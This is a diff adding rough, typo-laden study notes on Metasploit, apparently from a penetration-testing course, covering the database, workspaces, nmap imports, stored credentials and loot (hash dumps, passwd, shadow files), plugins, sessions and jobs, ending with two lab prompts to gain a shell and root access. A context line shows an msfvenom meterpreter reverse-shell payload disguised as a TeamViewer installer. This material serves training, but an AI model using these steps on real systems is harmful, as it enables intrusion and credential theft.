@@ -205,3 +205,113 @@ $msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.
 $msf-virustotal -k <API key> -f TeamViewerInstall.exe
 \\\\\\\\\\\\\\\\\\==============================
 DataBases
+used to keep track result, msfconsole has built-in support for the PostgreSQL db system, with it we have direct, quick, and easy access to scan result with added ability to import and export results in conjunction with 3rd party tools. it also can be used to configure exploit module parameters with already existing dindings directly
+\\Setting up the DataBases
+$sudo service postgresql status
+\\Start PostgreSQL
+$sudo systemctl start postgresql
+-after starting PostgreSQL, we need to create and initialize the MSF database with msfdb init 
+\\MSF - Initiate a database
+$sudo msfdb init
+<some time an error can occur if metasploit is not up to date. this diff tha cause the error can happen for several reasons.
+first, often it help to update Metasploit again (apt update) to solve this problem, then we can try to reinitalize the MSF database
+$sudo msfdb init
+< if the init is skipped and metasploit tells us that the db is already configured , we can recheck the status of the db
+$sudo msfdb status
+$sudo msfdb init  > start msfconsole  sudo msfdb run > connect to the created db simultaneously
+already gave the db configure and are not able to change pw to the MSF username, proceed with these command:
+\\MSF - Reinitate the database
+$msfdb reinit   >    $cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
+$sudo service postgresql restart  >  msfconsole -q    > db_status
+\\MSF - Database options
+msf> help database   >   db_status
+\\Using the Database
+workspaces like folder in a project. we can segregate the diff scan results, hosts, and extracted information by IP, subnet, network, or domain.
+-to view current workspace list, use the workspace command adding -a or -d switch after the command
+msf>workspace -a -d  :add delete
+-notice that the default Workspace is named default and is currently in use accodring to the * symbol, type the workspace[name] command switch the presently used workspace/
+msf>workspace -a Target_1
+$msf> workspace -h 
+\\Importing Scan results
+\\stored nmap scan
+$cat Target.nmap
+\\Importing Scan results
+$msf>db_import Target.xml    >   hosts   >  services
+\\Using Nmap Inside msfconsole
+alternative we can use Nmap straight from msfconsole to scan direct from the console without having to background or exit the process use the db_nmap command
+\\MSF - Nmap
+$msf>db_nmap -sV -sS 10.10.10.8
+msf> hosts
+\\Data Backup
+after finishing the session, make sure to backup our data if anything happen with the PostgreSQL service. todo so. use the db_export command
+\\MSF - DB export
+$msf>db_export -h > db_export -f xml backup.xml
+-other command related to data retention are the exteded use of hosts, services, and the creds and loot commands.
+\\hosts
+command display a db table automatically populated with the host addr, hostnames, and other information we find about these during our scans and interactios.
+-host can be manually added as separate entries in table. after adding our custom hosts, we can akso organize the format and structure of the table, add comments, change existing information
+\\MSF - Stored hosts
+$msf> hosts -h 
+\\services
+it contains a table with description and infor on service discovered during scan or interaction.the entries here are highly customizable
+\\MSF - stored services of hosts
+$msf>services -h 
+\\Credentials 
+creds command allow to visualize the credentials gathered during interactions with the target host, we can add cred  manually match existing cred with port specification add description
+\\MSF - Stored Credentials
+$msf>creds -h 
+$msf> creds -d -s SMB
+\\loot
+work in conjuntion with the command above to offer list owned services and user. the loot refers to hash dumps from diff system types, namely hashes, passwd, shadow,..
+\\MSF - Stored loot
+$msf> loot -h 
+\\\\\\\\\\\\\\\\\\\\\======================================
+Plugins
+everithing is aumomate doc by msfconsole into the db we are usingand hosts, services and vulnerabilities are made avail for user
+-plugins work directly with the API and can be used to manipulate the entire framework. they can be useful for automating repetive tasks, adding new commands to the msfconsole, and extending the already powerful atk
+\\Using Plugins
+ensure it is installed in the correctly dir on our machine, navi /usr/share/metasploit-framework/plugins, 
+default dir for every new installation of msfconsole.
+$ls /usr/share/metasploit-framework/plugins
+\\MSF - Load Nessus
+$msf>load Nessus   > nessus_help 
+\\Installing new Plugins
+-each update parrot os contain new plugin or we take .rb file tp /usr/share/metasploit-framework/plugins with th proper per 
+\\Downloading MSF plugins
+$git clone https://.... 
+$ls Metasploit-plugins   > load plugins
+\\Misins
+are one of those features that when implemented , offer a large amount of flexibility to both the creator of the script and the sure
+-Mixins are classes that act as methods for use by other classes without having tobe the parent class of those other classes
+They are mainly used when we:
+
+Want to provide a lot of optional features for a class.
+Want to use one particular feature for a multitude of classes.
+Most of the Ruby programming language revolves around Mixins as Modules. The concept of Mixins is implemented using the word include, to which we pass the name of the module as a parameter. We can read more about mixins here.
+https://en.wikibooks.org/wiki/Metasploit/UsingMixins
+\\sessions
+msfconsole can manage multiple modules at the same time. Sessions creates dedicated control interface for all of deplyed modules
+NOTE: once a session is placed in the background it will continue to run 
+\\Using Sessions.
+while runing any avail exploits or auxiliary modules in msfconsole, we can background the session as long as they form a channel of comm with the target host. 
+press the [CTRL] + [Z] or by typing background command in the case of Meterpreter stages.
+\\Listing Active sessions
+-we can use the sessions command to view our currently active sessions
+msf exploit(windows/smb/psexec_psh)> sessions
+\\Interacting with a Session
+$sessions -i [no.]
+\\Jobs
+ex: we scanning but need that port for other module we cannot terminate 
+-other types of tasks inside sessions can also be converted into jobs to run in the background seamlessly. even if the session or disappears
+\\Viewing the Jobs Command Help menu
+$jobs -h
+\\Viewing the EXploit Command Help menu
+run exploit as a job 
+$exploit -j, 
+\\Listing Running Jobs
+$jobs -language
+<test>Find the existing exploit in MSF and use it to get a shell on the target.
+What is the username of the user you obtained a shell with?
+
+<test>The target system has an old version of Sudo running. Find the relevant exploit 
+and get root access to the target system. Find the flag.txt file and submit the contents of it as the answer.
